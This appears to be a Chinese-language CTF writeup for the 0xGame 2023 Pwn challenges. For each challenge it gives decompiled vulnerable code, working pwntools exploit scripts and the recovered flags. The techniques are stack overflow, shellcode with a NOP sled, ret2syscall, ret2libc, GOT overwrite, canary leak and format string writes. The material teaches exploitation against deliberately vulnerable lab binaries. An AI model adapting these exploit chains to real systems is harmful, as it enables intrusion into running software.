---
title: 0xGame 2023 Writeup
date: 2023-10-30T19:38:23+08:00
tags: [CTF]
---

## Pwn

### [Week1] 找不到且不对劲的flag

> 这个黑不溜秋的框框是啥？
>
> 这是flag吗？
>
> 我flag呢？

根据题目描述，猜测 flag 被藏到了隐藏文件或者隐藏文件夹中。

```bash
$ nc 8.130.35.16 51000
$ ls -a
.
..
.bash_logout
.bashrc
.profile
.secret
bin
flag
lib
lib32
lib64
libexec
libx32
netcat
$ ls .secret
flag
$ cat .secret/flag
0xGame{N3t_cA7_M30w_9dn23hcx8}

```

### [Week 1] 永远进不去的后门

> 后门就在那里，但你就是进不去
>
> 气不气气不气

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[8]; // [rsp+0h] [rbp-40h] BYREF
  int v5; // [rsp+8h] [rbp-38h]

  bufinit(argc, argv, envp);
  puts("Welcome to 0xGame2023!");
  puts("Tell me sth interesting, and I will give you what you want.");
  read(0, buf, 0x100uLL);
  if ( v5 % 2023 == 2023 )
    system("/bin/sh");
  else
    puts("Not that interesting. Bye.");
  return 0;
}
```

read 存在溢出漏洞，直接覆盖掉 ret 地址即可得到 shell。

```python
from pwn import *

conn = remote("8.130.35.16", 51002)
conn.recvuntil("want.\n")
conn.sendline(b"a" * 0x48 + p64(0x401298))
conn.interactive()

# 0xGame{W3lC0me_4b0rd_PWN_L4nd!_k20cu2c7}
```

### [Week 1] 随便乱搞的shellcode

> shell壳code码，这怎么就乱搞了？

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char *buf; // [rsp+8h] [rbp-8h]
  void (*bufa)(void); // [rsp+8h] [rbp-8h]

  bufinit(argc, argv, envp);
  buf = (char *)mmap((void *)0x20230000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Now show me your code:");
  read(0, buf, 0x100uLL);
  puts("Implementing security mechanism...");
  v3 = time(0LL);
  srand(v3);
  bufa = (void (*)(void))&buf[rand() % 256];
  close(1);
  puts("Done!");
  bufa();
  return 0;
}
```

程序会随机执行 buf 中的一条命令，可以把 buf 的前面都填充 `nop` 指令，将 shellcode 放在 buf 的末尾来增加成功执行的概率。

`nop`：空指令（0x90），占用一个指令的时间，但什么都不做，并继续执行接下来的指令。

`str.rjust(width[, fillchar])`：将字符串右对齐到 width 长度，并在左侧填充 fillchar。

因为程序将标准输出流关闭了，所以得到 shell 以后可以执行 `exec 1>&2` 来将默认标准输出流重定向到标准错误流输出。

```python
from pwn import *

context(os="linux", arch="amd64")

conn = remote("8.130.35.16", 51003)
conn.recvuntil("code:\n")
conn.sendline(asm(shellcraft.sh()).rjust(0x100, b"\x90"))
conn.interactive()

# 0xGame{Try_to_Wr1t3_by_yourse1f!_an9d02cy}
```

### [Week1] 高端的syscall

> 系统调用是个好东西

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  bufinit(argc, argv, envp);
  puts("I leave something interesting in this program.");
  puts("Now try to find them out!");
  puts("Input: ");
  gets(v4);
  return 0;
}
```

程序开启了 NX 保护并且没有后门函数，可以自己手动构造 syscall 来得到 shell。

注意到程序还提供了几个辅助函数用来构造 syscall：

**set_rax**

```assembly
.text:0000000000401196                 endbr64
.text:000000000040119A                 push    rbp
.text:000000000040119B                 mov     rbp, rsp
.text:000000000040119E                 mov     [rbp-4], edi
.text:00000000004011A1                 mov     eax, [rbp-4]
.text:00000000004011A4                 pop     rbp
.text:00000000004011A5                 retn
```

**gadget**

```assembly
.text:00000000004011AE                 syscall                 ; LINUX -
```

几个知识点：

- `syscall` 会根据 `rax` 中存储的系统调用号来执行对应的系统调用函数。
- `__lib_csu_init` 中有两个方便的 gadgets 可以供我们使用。
- 过程中需要的字段可以通过 gets 存储到 .bss 段中使用。

```python
from pwn import *

context(arch="amd64", os="linux")

# s = gdb.debug("./ret2syscall", "break main")
s = process("./ret2syscall")
elf = ELF("./ret2syscall")

setrax = 0x401196
syscall = 0x4011AA
csu1 = 0x4012DA
csu2 = 0x4012C0
rdi = 0x4012E3

bss = 0x404500
execve = 0x3B

payload = flat([
    b"a" * 0x18,          // 覆盖到 retn 地址
    rdi, bss,             // 将 rdi 设置为 bss 起始地址
    elf.plt.gets,         // 执行 gets，将自定义数据写入 rdi 指向的值
    rdi, execve,          // 将 rdi 设置为 execve 的系统调用号
    setrax,               // 将 rax 的值设置为 rdi 指向的值

    csu1, 0, 0,  bss, 0, 0, bss+8,
    csu2
])

s.recvuntil("Input: ")
s.sendline(payload)
s.sendline(b"/bin/sh\0"+p64(syscall))
s.interactive()

```

### [Week1] 我后门呢

> aka ret2libc
>
> 目前只要知道，parital relro 下，调用库函数一次之后，got 表中会存放 libc 相关地址即可。剩余内容可以参考 ctf-wiki。

题目没有给后门函数，并且只开启了 NX 保护。此外，题目还提供了 libc.so.6 附件，可以使用 ret2libc。

首先，使用 ida 打开 libc.so.6 文件，可以得到版本为 2.31-0ubuntu9.9_amd64。这个版本在 glibc-all-in-one 中无法直接搜索到，可以在 https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.9 上下载。下载了对应的 deb 文件后，使用 glibc-all-in-one 的 extract 工具提取出对应的 ld-linux-x86-64.so.2，并使用 `patchelf ./ret2libc --set-interpreter path/to/ld-linux-x86-64.so.2` 和 `patchelf ./ret2libc --add-needed path/to/libc.so.6` 来指定正确的链接器和库。

之后，开始分析程序：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  bufinit(argc, argv, envp);
  puts("There won't be shell for you!");
  puts("Now give me your input:");
  read(0, buf, 0x100uLL);
  if ( strlen(buf) > 0x20 )
  {
    puts("No chance for you to overflow!");
    exit(1);
  }
  puts("See you next time!");
  return 0;
}
```

可以发现，存在一个 read 溢出点。`strlen()` 判断字符串长度的方式是一直读取直到遇到 `\0`，所以我们直接往字符串前面填入 `\0` 即可。

```python
from pwn import *
context(arch="amd64", os="linux")
io = process('./ret2libc', 'b main')

elf = ELF('./ret2libc')
libc = ELF('./libc.so.6')

rdi = 0x401333  # pop rdi（另见 ret2csu）

payload1 = flat([
    b'\0'*0x28,
    # 泄漏 got 表
    rdi, elf.got.read,
    elf.plt.puts,
    # 重新执行 main 函数以继续利用 read 函数
    elf.sym.main
])

io.recvuntil(b'input:\n')
io.sendline(payload1)
io.recvuntil(b'time!\n')

# u64() 接收一个 8 字节字符序列并解包为对应的地址
# 地址的高位一定是 \0，比如 0x00007f706a508fc0，输出时会被 puts 截断
# 所以可以保证 recvline() 得到的字符序列去掉行尾 \n 后一定是 8 字节以内的
# 最后使用 ljust(8, b"\0")) 向高位补齐 \0 即可
# 得到的地址是真实的 read 地址，减去 read 在 libc 中的偏移量即可得到 libc 基址
libc.address = u64(io.recvline()[:-1].ljust(8, b"\0")) - libc.sym.read

payload2 = flat([
    b'\0'*0x28,
    # system 函数中有使用到 movups xmmword 相关汇编指令，需要对栈进行对齐
    # 这里 rdi + 1 是一个 retn 语句，根据 rop 链的特性，可以返回到自己
    # 从而让栈多了一字节，实现对齐操作（另见栈对齐）
    rdi + 1,
    # libc.search 搜索 elf 文件中的文本，返回的是一个迭代器
    # 使用 next() 得到第一个 /bin/sh 所在的地址
    rdi, next(libc.search(b'/bin/sh')),
    # 当设置了 libc.address 后，plt, got, sym 的地址均会自动更新
    libc.sym.system
])

io.recvuntil(b'input:')
io.sendline(payload2)

io.interactive()
```

### [Week1] got-it

> 延迟绑定，got表里存的究竟是啥

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h] BYREF

  bufinit(argc, argv, envp);
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v3);
    if ( v3 == 8227 )
      break;
    if ( v3 <= 8227 )
    {
      if ( v3 == 4 )
      {
        puts("Thanks for using!");
        exit(0);
      }
      if ( v3 <= 4 )
      {
        switch ( v3 )
        {
          case 3:
            edit();
            break;
          case 1:
            add();
            break;
          case 2:
            show();
            break;
        }
      }
    }
  }
  trick();
}
```

可以看出，这一题是一个简单的管理系统，输入 1 可以写入数据，2 可以查看数据，8227（0x2023）可以执行 `trick()` 函数。

```c
int show()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("Input student id: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 15 )
    result = printf("Student name: %s\n", &list[8 * v1]);
  else
    result = puts("Invalid id!");
  return result;
}
int add()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("Input student id: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 15 )
    return puts("Invalid id!");
  printf("Input student name: ");
  return read(0, (char *)&list + 8 * v1, 8uLL);
}
void __noreturn trick()
{
  exit((int)"/bin/sh");
}
```

仔细观察，发现 `show()` 和 `add()` 均只对 id 的最大值进行了限制，没有对最小值进行限制。list 位于 .bss 段，可以通过写入负数来访问 got 表。`trick()` 中的 `exit()` 函数已经给定了 `/bin/sh` 参数，如果我们可以把 `exit()` 劫持成 `system()` 函数，即可得到权限。

```python
from pwn import *

context(os='linux', arch='amd64')

elf = ELF('./got-it')
libc = ELF('./libc.so.6')

io = process('./got-it')

io.recvuntil('>> ')
io.sendline('2')
io.recvuntil('id: ')
# show 泄漏 got 表
io.sendline(str(int((elf.got.puts-elf.sym.list)/8)))
io.recvuntil('name: ')
libc.address = u64(io.recvline()[:-1].ljust(8, b'\0'))-libc.sym.puts

io.recvuntil('>> ')
io.sendline('1')
io.recvuntil('id: ')
io.sendline(str(int((elf.got.exit-elf.sym.list)/8)))
io.recvuntil('name: ')
# 把 exit 劫持成 system
io.sendline(p64(libc.sym.system))

io.recvuntil('>> ')
io.sendline('8227')

io.interactive()
```

### [Week2] ezcanary

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+Fh] [rbp-21h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  bufinit(argc, argv, envp);
  puts("Ur name plz?");
  read(0, buf, 0x100uLL);
  printf("Hello, %s. Is that right?", buf);
  v4 = getchar();
  if ( v4 == 121 || v4 == 89 )
  {
    puts("Then new name plz.");
    read(0, buf, 0x100uLL);
    printf("Hello, %s.", buf);
  }
  puts("Wish you a wonderful day. Bye.");
  return 0;
}
```

题目开启了 Canary 保护，并且提供了后门函数。 

Canary 保护在进入函数时会在 ebp 前方添加一个 8 字节的随机数，当程序将要返回时，会比对随机数是否发生改变。如果发生了改变，说明被栈溢出修改了 retn 地址，从而结束进程，保护程序。为了防止 Canary 被意外输出，随机数的最低位始终是 `\0`。因此，如果程序存在一次可以写入后读取的操作，就可以一直覆盖到 Canary 的第一个 `\0`，从而得到 Canary 值，进行栈溢出。

| Stack  |
| ------ |
| ...    |
| canary |
| ebp    |
| ...    |

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
io = process('./pwn')
elf = ELF('./pwn')

rdi = 0x40138B

io.recvuntil('plz?')
io.send(b'a'*0x19)
io.recvuntil(b'a'*0x19)  # 覆盖到 canary 的第一个字节
canary = b'\0'+io.recv(7)  # canary 的第一个字节一定是 \0
payload = flat([
    b'a'*0x18,
    canary,
    0,
    rdi+1,  # retn 用于栈对齐
    rdi,
    elf.search(b'/bin/sh').__next__(),
    elf.plt.system
])
io.recvuntil('right?')
io.send('y')
io.recvuntil('plz.')
io.send(payload)
io.interactive()

```

### [Week2] fmt1

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[256]; // [rsp+0h] [rbp-110h] BYREF
  int v5; // [rsp+100h] [rbp-10h] BYREF
  int v6; // [rsp+104h] [rbp-Ch]
  int *v7; // [rsp+108h] [rbp-8h]

  bufinit(argc, argv, envp);
  v7 = &v5;
  v6 = 0x2023;
  v5 = 0x20FF;
  printf("Input your content: ");
  read(0, buf, 0x100uLL);
  printf(buf);
  if ( v6 == v5 )
  {
    puts("Congratulations! Now here is your shell!");
    puts("And welcome to format string world!");
    system("/bin/sh");
  }
  return 0;
}
```

程序直接将用户输入的文本作为格式化字符串传入了 `printf` 函数中，存在格式化字符串漏洞。

格式化字符串中存在以下可以写入输出字符数量的格式符：

- 写入 4 字节：`%n`
- 写入 2 字节：`%hn`
- 写入 1 字节：`%hhn`

此外，在 POSIX 拓展中存在可以指定参数顺序的格式符：`%n$`，代表使用第 n 个参数。

根据 64 位函数调用传参约定，我们可以选择一个指定的参数顺序来指定要写入的地址指针。即分别为 `rsi, rdx, rcx, r8, r9, rsp, rsp+8, ...`。

在这里，我们想要将 v5 的值更改为 0x2023，首先要得到 v5 的地址，即为 v7 的值。所以我们要写入的地址存储在 rsp+108h 中，也就是第 6+0x108/8=39 个参数。要写入的数据是 0x23，也就是 35。所以构造 payload 即为 `%35c%39$hhn`。

### [Week2] fmt2

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf[256]; // [rsp+0h] [rbp-100h] BYREF

  bufinit(argc, argv, envp);
  while ( 1 )
  {
    do
    {
      printf("Input your content: ");
      read(0, buf, 0x100uLL);
      printf(buf);
    }
    while ( a != 0xDEADBEEF );
    system("/bin/sh");
  }
}
```

需要使用格式化字符串修改 bss 段上的数据 a。这里使用 pwntools 中提供的自动化工具 FmtStr 进行读取和写入栈操作。首先需要提供一个函数，用于对进程进行输入输出。因为程序提供了一个循环，所以可以直接写上输入输出。如果程序没有提供循环，需要在函数内每次重新启动或连接。

```python
def exec_fmt(payload):
    io.recvuntil('content:')
    io.sendline(payload)
    return io.recvline(timeout=1)
```

因为程序最后执行 payload 的时候不会输出换行符，所以这里加上一个 `timeout=1` 避免一直等待接收数据。

之后，即可使用 `FmtStr(exec_fmt)` 创建一个自动化格式字符串对象进行操作。

使用 `auto.leak_stack(offset)` 可以读取某个参数的值。使用 `auto.write(addr, data)` 和 `auto.execute_writes()` 可以批量执行写入。

因为 `main` 函数会被 `__libc_start_main` 调用，而 `__libc_start_main` 中存在 `main` 函数的地址。所以我们可以使用 gdb 在 rbp 附近寻找。在这里就是第 (rbp+0x28-rsp)/8+6=43 个参数。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

io = process('./fmt2')
elf = ELF('./fmt2')

def exec_fmt(payload):
    io.recvuntil('content:')
    io.sendline(payload)
    return io.recvline(timeout=1)

auto = FmtStr(exec_fmt)
elf.address = auto.leak_stack(43) - elf.sym.main

auto.write(elf.sym.a, 0xdeadbeef)
auto.execute_writes()

io.interactive()

```

### [Week2] leak-env

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[1] = (void *)__readfsqword(0x28u);
  bufinit(argc, argv, envp);
  printf("Here's your gift: %p\n", &printf);
  puts("You have a chance to arbitrary read 8 bytes.");
  printf("Where do you want to read?");
  __isoc99_scanf("%p", buf);
  printf("Here you are: ");
  write(1, buf[0], 8uLL);
  putchar(10);
  puts("Now show me your magic.");
  printf("Where do you want to place it?");
  __isoc99_scanf("%p", buf);
  puts("Now place it.");
  read(0, buf[0], 0x30uLL);
  printf("Good luck!");
  return 0;
}
```

题目提供了 libc 的地址，需要得到栈的地址来实现栈溢出。这里通过 libc 中的 __environ 环境变量来得到栈地址。

__environ 是一个全局变量，他是一个环境变量数组，其指向的数据在栈上，可以通过这种方法得到栈的地址。

```python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

libc = ELF("../dist/libc.so.6")
io = gdb.debug("./leakenv")

io.recvuntil(b"Here's your gift: ")
libc.address = eval(io.recvline()[:-1])-libc.sym.printf
environ = libc.sym.__environ
io.sendlineafter(b"Where do you want to read?", hex(environ))
io.recvuntil(b"Here you are: ")
stack = u64(io.recv(8))
ret = stack-0x100
io.sendlineafter(b"Where do you want to place it?", hex(ret))
io.sendafter(b"Now place it.", flat([
    libc.address+0x23b63, 0, 0, 0, 0,  // r12 must be NULL
    libc.address+0xe3afe,              // one_gadget
]))

io.interactive()

```

### [Week3] all-in-files

> 一切皆文件是一种哲学

首先打开ida分析题目给的二进制文件。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  char v5[4]; // [rsp+8h] [rbp-8h] BYREF
  int fd; // [rsp+Ch] [rbp-4h]

  bufinit(argc, argv, envp);
  printf("Input filename to open: ");
  filename[(int)read(0, filename, 0x1FuLL)] = 0;
  printf("Input file id to read from: ");
  __isoc99_scanf("%d", v5);
  printf("Input file id to write to: ");
  __isoc99_scanf("%d", &v4);
  close(1);
  fd = open(filename, 0);
  if ( fd != -1 )
  {
    read(fd, &filebuf, 0x1FFuLL);
    write(v4, &filebuf, 0x1FFuLL);
    exit(0);
  }
  puts("Failed to open file!");
  return 0;
}
```

大致思路是读取 `/flag` 中的内容，然后输出到屏幕。注意到标准输出流（fd=1）被关闭了，可以用标准错误流（fd=2）代替。

```bash
Input filename to open: /flag
Input file id to read from: 3
Input file id to write to: 2

```

发现程序并没有返回任何内容。打开gdb进行调试，发现在读入 `filename` 的时候，读取的是 `/flag\n`，最终`fd`的值为 `-1`，推测是因为末尾的`\n`导致无法读取成功，最后因为标准输出流被关闭了，所以不会输出 `Failed to open file!` 提示用户。

使用 `pwntools` 来输入 `/flag\0`，保证不会因为 `\n` 的原因而无法读取文件：

```python
from pwn import *

conn = remote("8.130.35.16", 53000)

conn.recvuntil(b"Input filename to open: ")
conn.sendline(b"/flag\0")
conn.recvuntil(b"Input file id to read from: ")
conn.sendline(b"3")
conn.recvuntil(b"Input file id to write to: ")
conn.sendline(b"2")
print(conn.recvline())

# 0xGame{A11_1s_files_H3R3_1n9d2h9c}
```

